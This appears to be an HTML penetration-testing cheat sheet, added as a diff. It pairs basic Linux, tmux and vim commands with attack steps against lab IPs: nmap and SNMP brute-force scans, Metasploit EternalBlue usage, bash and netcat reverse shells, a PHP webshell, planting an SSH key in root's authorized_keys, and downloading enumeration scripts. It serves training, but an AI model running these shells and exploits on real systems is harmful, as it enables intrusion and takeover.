@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Linux Cheat Sheet</title>
+</head>
+
+<body>
+    <style>
+        *{
+    border: 0;
+    margin: 0;
+    padding: 0;
+    font-size: 17px;
+}
+
+body{
+    background-color: #192330;
+    color: #CAD2E2;
+    font-family: neue-haas-unica, sans-serif;
+}
+
+.modal-body{
+    margin: 0 100px;
+    padding: 50px 0;
+}
+
+code{
+    color: #9FEF00;
+}
+
+.claro{
+    background-color: #202A38;
+}
+
+td{
+    padding: 10px;
+    /* border: 2px solid red; */
+}
+
+h2{
+    text-align: center;
+    font-size: 25px;
+    margin: 10px;
+}
+
+td strong{
+    margin-top: 50px;
+    color: #fff;
+}
+    </style>
+    <div class="modal-body">
+        <div class="text-center text-break">
+            <h2>Basic Tools</h2>
+            <div class="table-responsive">
+                <table class="table table-striped text-left">
+                    <thead>
+                        <tr>
+                            <th><strong>Command</strong></th>
+                            <th><strong>Description</strong></th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr class="claro">
+                            <td><strong>General</strong></td>
+                            <td></td>
+                        </tr>
+                        <tr>
+                            <td><code>sudo openvpn user.ovpn</code></td>
+                            <td>Connect to VPN</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>ifconfig</code>/<code>ip a</code></td>
+                            <td>Show our IP address</td>
+                        </tr>
+                        <tr>
+                            <td><code>netstat -rn</code></td>
+                            <td>Show networks accessible via the VPN</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>ssh user@10.10.10.10</code></td>
+                            <td>SSH to a remote server</td>
+                        </tr>
+                        <tr>
+                            <td><code>ftp 10.129.42.253</code></td>
+                            <td>FTP to a remote server</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><strong>tmux</strong></td>
+                            <td></td>
+                        </tr>
+                        <tr>
+                            <td><code>tmux</code></td>
+                            <td>Start tmux</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>ctrl+b</code></td>
+                            <td>tmux: default prefix</td>
+                        </tr>
+                        <tr>
+                            <td><code>prefix c</code></td>
+                            <td>tmux: new window</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>prefix 1</code></td>
+                            <td>tmux: switch to window (<code>1</code>)</td>
+                        </tr>
+                        <tr>
+                            <td><code>prefix shift+%</code></td>
+                            <td>tmux: split pane vertically</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>prefix shift+"</code></td>
+                            <td>tmux: split pane horizontally</td>
+                        </tr>
+                        <tr>
+                            <td><code>prefix -&gt;</code></td>
+                            <td>tmux: switch to the right pane</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><strong>Vim</strong></td>
+                            <td></td>
+                        </tr>
+                        <tr>
+                            <td><code>vim file</code></td>
+                            <td>vim: open <code>file</code> with vim</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>esc+i</code></td>
+                            <td>vim: enter <code>insert</code> mode</td>
+                        </tr>
+                        <tr>
+                            <td><code>esc</code></td>
+                            <td>vim: back to <code>normal</code> mode</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>x</code></td>
+                            <td>vim: Cut character</td>
+                        </tr>
+                        <tr>
+                            <td><code>dw</code></td>
+                            <td>vim: Cut word</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>dd</code></td>
+                            <td>vim: Cut full line</td>
+                        </tr>
+                        <tr>
+                            <td><code>yw</code></td>
+                            <td>vim: Copy word</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>yy</code></td>
+                            <td>vim: Copy full line</td>
+                        </tr>
+                        <tr>
+                            <td><code>p</code></td>
+                            <td>vim: Paste</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>:1</code></td>
+                            <td>vim: Go to line number 1.</td>
+                        </tr>
+                        <tr>
+                            <td><code>:w</code></td>
+                            <td>vim: Write the file 'i.e. save'</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>:q</code></td>
+                            <td>vim: Quit</td>
+                        </tr>
+                        <tr>
+                            <td><code>:q!</code></td>
+                            <td>vim: Quit without saving</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>:wq</code></td>
+                            <td>vim: Write and quit</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+            <h2>Pentesting</h2>
+            <div class="table-responsive">
+                <table class="table table-striped text-left">
+                    <thead>
+                        <tr>
+                            <th><strong>Command</strong></th>
+                            <th><strong>Description</strong></th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr class="claro">
+                            <td><strong>Service Scanning</strong></td>
+                            <td></td>
+                        </tr>
+                        <tr>
+                            <td><code>nmap 10.129.42.253</code></td>
+                            <td>Run nmap on an IP</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>nmap -sV -sC -p- 10.129.42.253</code></td>
+                            <td>Run an nmap script scan on an IP</td>
+                        </tr>
+                        <tr>
+                            <td><code>locate scripts/citrix</code></td>
+                            <td>List various available nmap scripts</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>nmap --script smb-os-discovery.nse -p445 10.10.10.40</code></td>
+                            <td>Run an nmap script on an IP</td>
+                        </tr>
+                        <tr>
+                            <td><code>netcat 10.10.10.10 22</code></td>
+                            <td>Grab banner of an open port</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>smbclient -N -L \\\\10.129.42.253</code></td>
+                            <td>List SMB Shares</td>
+                        </tr>
+                        <tr>
+                            <td><code>smbclient \\\\10.129.42.253\\users</code></td>
+                            <td>Connect to an SMB share</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0</code></td>
+                            <td>Scan SNMP on an IP</td>
+                        </tr>
+                        <tr>
+                            <td><code>onesixtyone -c dict.txt 10.129.42.254</code></td>
+                            <td>Brute force SNMP secret string</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><strong>Web Enumeration</strong></td>
+                            <td></td>
+                        </tr>
+                        <tr>
+                            <td><code>gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</code>
+                            </td>
+                            <td>Run a directory scan on a website</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</code>
+                            </td>
+                            <td>Run a sub-domain scan on a website</td>
+                        </tr>
+                        <tr>
+                            <td><code>curl -IL https://www.inlanefreight.com</code></td>
+                            <td>Grab website banner</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>whatweb 10.10.10.121</code></td>
+                            <td>List details about the webserver/certificates</td>
+                        </tr>
+                        <tr>
+                            <td><code>curl 10.10.10.121/robots.txt</code></td>
+                            <td>List potential directories in <code>robots.txt</code></td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>ctrl+U</code></td>
+                            <td>View page source (in Firefox)</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Public Exploits</strong></td>
+                            <td></td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>searchsploit openssh 7.2</code></td>
+                            <td>Search for public exploits for a web application</td>
+                        </tr>
+                        <tr>
+                            <td><code>msfconsole</code></td>
+                            <td>MSF: Start the Metasploit Framework</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>search exploit eternalblue</code></td>
+                            <td>MSF: Search for public exploits in MSF</td>
+                        </tr>
+                        <tr>
+                            <td><code>use exploit/windows/smb/ms17_010_psexec</code></td>
+                            <td>MSF: Start using an MSF module</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>show options</code></td>
+                            <td>MSF: Show required options for an MSF module</td>
+                        </tr>
+                        <tr>
+                            <td><code>set RHOSTS 10.10.10.40</code></td>
+                            <td>MSF: Set a value for an MSF module option</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>check</code></td>
+                            <td>MSF: Test if the target server is vulnerable</td>
+                        </tr>
+                        <tr>
+                            <td><code>exploit</code></td>
+                            <td>MSF: Run the exploit on the target server is vulnerable</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><strong>Using Shells</strong></td>
+                            <td></td>
+                        </tr>
+                        <tr>
+                            <td><code>nc -lvnp 1234</code></td>
+                            <td>Start a <code>nc</code> listener on a local port</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1'</code></td>
+                            <td>Send a reverse shell from the remote server</td>
+                        </tr>
+                        <tr>
+                            <td><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1234 &gt;/tmp/f</code>
+                            </td>
+                            <td>Another command to send a reverse shell from the remote server</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc -lvp 1234 &gt;/tmp/f</code>
+                            </td>
+                            <td>Start a bind shell on the remote server</td>
+                        </tr>
+                        <tr>
+                            <td><code>nc 10.10.10.1 1234</code></td>
+                            <td>Connect to a bind shell started on the remote server</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></td>
+                            <td>Upgrade shell TTY (1)</td>
+                        </tr>
+                        <tr>
+                            <td><code>ctrl+z</code> then <code>stty raw -echo</code> then <code>fg</code> then
+                                <code>enter</code> twice
+                            </td>
+                            <td>Upgrade shell TTY (2)</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>echo "&lt;?php system(\$_GET['cmd']);?&gt;" &gt; /var/www/html/shell.php</code>
+                            </td>
+                            <td>Create a webshell php file</td>
+                        </tr>
+                        <tr>
+                            <td><code>curl http://SERVER_IP:PORT/shell.php?cmd=id</code></td>
+                            <td>Execute a command on an uploaded webshell</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><strong>Privilege Escalation</strong></td>
+                            <td></td>
+                        </tr>
+                        <tr>
+                            <td><code>./linpeas.sh</code></td>
+                            <td>Run <code>linpeas</code> script to enumerate remote server</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>sudo -l</code></td>
+                            <td>List available <code>sudo</code> privileges</td>
+                        </tr>
+                        <tr>
+                            <td><code>sudo -u user /bin/echo Hello World!</code></td>
+                            <td>Run a command with <code>sudo</code></td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>sudo su -</code></td>
+                            <td>Switch to root user (if we have access to <code>sudo su</code>)</td>
+                        </tr>
+                        <tr>
+                            <td><code>sudo su user -</code></td>
+                            <td>Switch to a user (if we have access to <code>sudo su</code>)</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>ssh-keygen -f key</code></td>
+                            <td>Create a new SSH key</td>
+                        </tr>
+                        <tr>
+                            <td><code>echo "ssh-rsa AAAAB...SNIP...M= user@parrot" &gt;&gt; /root/.ssh/authorized_keys</code>
+                            </td>
+                            <td>Add the generated public key to the user</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>ssh root@10.10.10.10 -i key</code></td>
+                            <td>SSH to the server with the generated private key</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Transferring Files</strong></td>
+                            <td></td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>python3 -m http.server 8000</code></td>
+                            <td>Start a local webserver</td>
+                        </tr>
+                        <tr>
+                            <td><code>wget http://10.10.14.1:8000/linpeas.sh</code></td>
+                            <td>Download a file on the remote server from our local machine</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</code></td>
+                            <td>Download a file on the remote server from our local machine</td>
+                        </tr>
+                        <tr>
+                            <td><code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code></td>
+                            <td>Transfer a file to the remote server with <code>scp</code> (requires SSH access)</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>base64 shell -w 0</code></td>
+                            <td>Convert a file to <code>base64</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>echo f0VMR...SNIO...InmDwU | base64 -d &gt; shell</code></td>
+                            <td>Convert a file from <code>base64</code> back to its orig</td>
+                        </tr>
+                        <tr class="claro">
+                            <td><code>md5sum shell</code></td>
+                            <td>Check the file's <code>md5sum</code> to ensure it converted correctly</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
